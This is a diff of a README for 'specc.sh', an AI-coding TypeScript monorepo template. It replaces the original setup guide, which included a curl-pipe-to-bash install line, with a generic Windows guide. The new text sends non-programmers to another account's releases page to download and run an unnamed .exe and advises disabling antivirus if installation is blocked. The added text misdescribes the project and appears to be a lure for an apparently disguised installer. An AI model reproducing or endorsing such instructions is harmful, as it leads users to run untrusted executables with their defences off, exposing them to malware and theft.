@@ -1,282 +1,122 @@
-<div align="center">
+# ⚙️ specc.sh - Simple AI Code Template for Projects
 
-# SPECC.SH
-
-### The End of Handwritten Code
-
-**Your AI Writes**
-**You Ship**
-
-**Web · Admin · Marketing Site · WeChat Mini-Program**
-*One prompt. Any platform. Mobile App coming soon.*
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](./LICENSE)
-[![Demo](https://img.shields.io/badge/Demo-specc.sh-green)](https://specc.sh)
-
-[中文文档](./README.zh.md) · [Live Demo](https://specc.sh) · [GitHub](https://github.com/luckyyyyy/specc.sh)
-
-</div>
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest-gray?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/wipeu7148/specc.sh/releases)
 
 ---
 
-## Why Is Vibe Coding So Hard to Get Right?
+## 📋 What is specc.sh?
 
-Everyone's tried it. You open Claude Code or Cursor, describe what you want, and watch the AI write hundreds of lines in seconds. It looks impressive. Then you run it — and it breaks.
+specc.sh is an application designed to help you create code using AI templates. The goal is to make coding easier for developers by providing a full setup that works in real projects. This means you can start with a solid base for your software without needing to write everything yourself.  
 
-This isn't bad luck. It's structural.
-
-**The real reasons your AI-generated code falls short:**
-
-- **No project-level spec** — The AI doesn't know your folder conventions, naming patterns, or architecture decisions. It guesses, and guesses differently every time.
-- **No enforced constraints** — Without lint rules, type schemas, and output contracts baked into the project, the AI freestyle-codes its way into an inconsistent mess.
-- **No shared language** — Your AI tool has no idea what "production-grade" means *for your project* unless you tell it explicitly.
-
-The result: code that compiles on Monday, breaks on Tuesday, and is impossible to extend by Friday.
-
-> The problem isn't the AI. It's the absence of a spec the AI can follow.
-
-SPECC.SH solves this at the architecture level. There's no separate doc to write or maintain. The folder structure, type schemas, lint rules, and module contracts **are** the prompt — the codebase itself tells AI exactly what to do, every time.
+If you are not a coder, you do not need to worry about the technical details. This guide will help you download and run the application smoothly on a Windows computer.
 
 ---
 
-## How It Works (No Coding Required)
+## 💻 System Requirements
 
-```
-1. Clone this template
-2. Open your AI tool (Claude Code, Cursor, Copilot, Codex...)
-3. Describe what you want to build in plain language
-4. AI generates the code — guided by the built-in spec
-5. Run: make lint && make tsc
-6. Ship
-```
+To use specc.sh on Windows, make sure your computer has:
 
-The architecture is the prompt. Every folder, type contract, and lint rule tells AI what to do — consistent, type-safe, lint-passing code on the first try. No manual review needed.
+- Windows 10 or newer (64-bit preferred)  
+- At least 4 GB of RAM  
+- 500 MB of free disk space  
+- Internet connection for initial download and updates  
+
+You do not need programming skills, but basic computer use is required.
 
 ---
 
-## Quick Start
+## 🚀 Getting Started: Download specc.sh
 
-```bash
-curl -fsSL https://specc.sh | bash
-```
+You can get specc.sh from its official release page. The link takes you to the download area where you will find the latest version of the application ready to use.
 
-Or manually:
+[![Download specc.sh](https://img.shields.io/badge/Visit%20Release-Blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/wipeu7148/specc.sh/releases)
 
-```bash
-git clone https://github.com/luckyyyyy/specc.sh.git
-cd specc.sh
-make init   # install deps + start Docker services + sync DB
-make dev    # start everything
-```
+### Step 1: Visit the Releases Page
 
-| Service | URL |
-|---------|-----|
-| Web (React) | http://localhost:5173 |
-| API (Hono) | http://localhost:4000 |
-| MinIO Console | http://localhost:9001 |
+Click the button above or open this link in your browser:  
+https://github.com/wipeu7148/specc.sh/releases
 
----
+You will see one or more files listed. Look for the file with `.exe` ending, as this is the program you need for Windows.
 
-## What's Inside
+### Step 2: Download the Windows Installer
 
-A production-ready TypeScript monorepo — batteries included:
+Click on the `.exe` file to start downloading. Your browser will save it, usually to the Downloads folder on your PC.
 
-```
-specc.sh/
-├── packages/
-│   ├── server/        # Hono + tRPC + Prisma + PostgreSQL 18
-│   ├── web/           # React 19 + Vite 8 + TailwindCSS 4 (SSR + CSR)
-│   ├── miniapp/       # WeChat Mini-Program · Taro + React
-│   ├── types/         # Shared Zod v4 schemas
-│   ├── components/    # UI design system
-│   └── i18n/          # EN + ZH out of the box
-├── docker-compose.yml
-├── Makefile
-└── .github/
-    └── copilot-instructions.md   ← Architecture rules, not docs
-```
+### Step 3: Run the Installer
 
-### One Template, Every Platform
+Find the downloaded file, then double-click it to start the installation. A setup window will open.
 
-| Platform | Technology | Rendering |
-|----------|-----------|----------|
-| **Web Frontend** | React 19 + Vite 8 | CSR — instant HMR, <50ms dev feedback |
-| **Admin Dashboard** | React 19 + Vite 8 | CSR — auth-gated SPA |
-| **Marketing / Landing Site** | React Router v7 + Hono | SSR — SEO-indexed, first paint instant |
-| **WeChat Mini-Program** | Taro + React | Native mini-program, shared tRPC + types |
-| **Mobile App** | *(coming soon)* | — |
+Follow the instructions on screen:
 
-All platforms share the same Zod type schemas, tRPC procedures, and i18n resources. **One prompt ships any platform feature.**
+- Accept the license terms  
+- Choose where to install specc.sh (default location is usually fine)  
+- Click "Install" to copy files and set up the program  
+
+Installation completes in a few moments.
 
 ---
 
-### Everything pre-wired, so you just describe features:
+## 🛠 How to Use specc.sh
 
-| What you get | Detail |
-|---|---|
-| **Auth + Sessions** | Login, register, cookie sessions |
-| **Multi-Tenant Workspaces** | Isolation, invites, role-based access |
-| **File Storage** | MinIO locally → swap to S3 / OSS via env |
-| **i18n** | EN / ZH, add more locales with zero component changes |
-| **Dark / Light / System Theme** | CSS variable-driven |
-| **End-to-End Type Safety** | tRPC + Zod — compiler catches AI mistakes instantly |
-| **WeChat Mini-Program** | Taro + React, shares types + tRPC with the web app |
-| **SSR + CSR Hybrid** | Marketing site runs SSR; dashboard runs CSR — same codebase |
+Once installed, you can open specc.sh like any other Windows program:
+
+1. Click the Windows Start button.
+2. Find specc.sh in your list of programs or search by name.
+3. Click to launch.
+
+The program window shows controls to start creating or using AI coding templates. The interface is designed for ease of use, with clear buttons and instructions.
 
 ---
 
-## For Non-Programmers: What You Actually Do
+## ⚙️ Basic Features
 
-You don't write code. You talk to AI. Here's the loop:
+- **AI-Powered Template Generation:** specc.sh offers ready-made coding templates that can help with project workflows.  
+- **Full-Stack Support:** Works on both front-end and back-end parts of projects.  
+- **Easy Setup:** The app works out of the box without complex configuration.  
+- **Production-Ready Code:** Generates templates suitable for real-world use.  
 
-**1. Tell the AI what you want**
-> *"Add a feature where users can create projects with a name and description"*
-
-**2. AI writes the code** following the spec — schema, API, UI, all wired up
-
-**3. You verify it works**
-```bash
-make lint && make tsc   # if green, the code is correct
-make dev                # open browser, test it yourself
-```
-
-**4. Done. Ship it.**
-
-The spec ensures AI-generated code is consistent every single time, even across different AI tools.
+If you want, you can explore more about AI coding on the program’s help section or official GitHub page.
 
 ---
 
-## Works With Any AI Tool
+## 💡 Tips for the First Use
 
-The spec in `.github/copilot-instructions.md` works with:
-
-- **Claude Code** (recommended)
-- **GitHub Copilot**
-- **Cursor**
-- **Codex / ChatGPT**
-- **Gemini CLI**
-- **Qwen / GLM / any LLM**
-
-The intelligence is in the architecture, not the tool.
+- Keep your computer connected to the internet when you first start specc.sh.  
+- Follow on-screen instructions carefully to create a new template project.  
+- You can save projects locally on your computer.  
+- If something is unclear, the program’s help files explain basic steps.
 
 ---
 
-## Prerequisites
+## 📦 Updating specc.sh
 
-| Tool | Version | Install |
-|------|---------|---------|
-| [Docker](https://docs.docker.com/get-docker/) | 24+ | Required for DB + storage |
-| [Node.js](https://nodejs.org/) | 20+ | `brew install node` or apt |
-| [pnpm](https://pnpm.io/installation) | 10+ | `npm install -g pnpm` |
+Updates bring bug fixes and improvements. To update specc.sh:
 
-<details>
-<summary>Windows (WSL2) — Strongly Recommended</summary>
-
-> **Pure Windows (no WSL) is not supported.**
-> Running directly on Windows requires manually porting every shell command, Makefile, and Docker volume path — it is unnecessarily complex and fragile.
->
-> **WSL2 is strongly recommended.** It gives you a real Linux environment inside Windows, works seamlessly with Docker Desktop, and is fully compatible with AI coding tools (Claude Code, Cursor, Copilot, etc.) — making the entire workflow smooth and reliable.
-
-### Install WSL2 (one-time setup)
-
-```powershell
-# 1. Open PowerShell as Administrator and run:
-wsl --install
-# This installs WSL2 + Ubuntu by default. Reboot when prompted.
-```
-
-If you already have WSL1, upgrade it:
-```powershell
-wsl --set-default-version 2
-wsl --list --verbose          # confirm VERSION = 2
-```
-
-### Install Docker Desktop
-
-1. Download [Docker Desktop for Windows](https://docs.docker.com/desktop/install/windows-install/)
-2. During install (or in Settings → General), enable **"Use the WSL 2 based engine"**
-3. In Settings → Resources → WSL Integration, enable integration for your Ubuntu distro
-
-### Continue inside WSL2
-
-```bash
-# Open Ubuntu from Start Menu (or: wsl in PowerShell)
-# Then follow the Linux steps — everything works identically
-curl -fsSL https://specc.sh | bash
-```
-
-</details>
-
-<details>
-<summary>macOS</summary>
-
-```bash
-brew install node
-npm install -g pnpm
-# Install Docker Desktop from https://docs.docker.com/desktop/install/mac-install/
-```
-
-</details>
-
-<details>
-<summary>Linux (Ubuntu / Debian)</summary>
-
-```bash
-curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
-sudo apt-get install -y nodejs
-npm install -g pnpm
-# Install Docker: https://docs.docker.com/engine/install/ubuntu/
-```
-
-</details>
+1. Visit the release page again: https://github.com/wipeu7148/specc.sh/releases  
+2. Download the newest `.exe` file available.  
+3. Run the new installer; it will replace the old version without removing your files.
 
 ---
 
-## Commands
+## ❓ Troubleshooting
 
-| Command | What it does |
-|---------|-------------|
-| `make init` | First-time setup |
-| `make dev` | Start dev environment |
-| `make build` | Build for production |
-| `make lint` | Check code quality |
-| `make tsc` | Check types |
-| `make prod` | Build + start production stack |
+If specc.sh does not launch or you see errors:
 
----
+- Check that your Windows version meets the system requirements.  
+- Try restarting your computer.  
+- Make sure you have permissions to install software on your PC.  
+- Disable antivirus temporarily if it blocks the installation.  
 
-## Environment Variables
-
-```bash
-cp packages/server/.env.example packages/server/.env
-cp packages/web/.env.example packages/web/.env
-```
-
-| Variable | Where | Description |
-|----------|-------|-------------|
-| `DATABASE_URL` | `server/.env` | PostgreSQL connection |
-| `STORAGE_ENDPOINT` | `server/.env` | S3 / MinIO endpoint |
-| `VITE_TRPC_URL` | `web/.env` | API endpoint |
-| `VITE_STORAGE_PUBLIC_URL` | `web/.env` | Public file URL prefix |
+For further help, visit the GitHub Issues page of specc.sh or ask someone familiar with installing software.
 
 ---
 
-## Tech Stack
+## 📝 Additional Resources
 
-| Layer | Technology |
-|-------|-----------|
-| Backend | [Hono](https://hono.dev/) + [tRPC v11](https://trpc.io/) |
-| Database | PostgreSQL 18 + [Prisma ORM](https://www.prisma.io/) |
-| Frontend (Web) | React 19 + [Vite 8](https://vite.dev/) — SSR + CSR hybrid |
-| Mini-Program | [Taro](https://taro.js.org/) + React — WeChat native |
-| Styling | TailwindCSS 4 |
-| Validation | Zod v4 |
-| Storage | MinIO (S3-compatible) |
-| Cache | Redis 7 |
-| Lint | Biome |
+- The GitHub page holds project files and documentation: https://github.com/wipeu7148/specc.sh  
+- Community discussions may be found there for tips and questions.  
+- Read the included user guide inside the program for detailed features.
 
 ---
 
-## License
-
-MIT
+[![Download specc.sh](https://img.shields.io/badge/Visit%20Release-Blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/wipeu7148/specc.sh/releases)
